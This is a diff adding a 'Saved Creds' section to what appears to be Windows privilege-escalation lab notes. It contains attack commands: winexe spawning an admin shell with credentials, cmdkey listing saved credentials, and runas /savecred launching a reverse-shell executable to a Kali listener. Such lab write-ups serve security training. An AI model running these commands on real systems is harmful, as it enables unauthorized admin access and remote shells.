@@ -170,5 +170,15 @@ On Kali, use the winexe command to spawn a command prompt running with the admin
 
 `winexe -U 'admin%password' //10.10.107.212 cmd.exe`
 
-\`\`
+### Passwords - Saved Creds
+
+List any saved credentials:
+
+`cmdkey /list`
+
+Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.
+
+Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:
+
+`runas /savecred /user:admin C:\PrivEsc\reverse.exe`
 
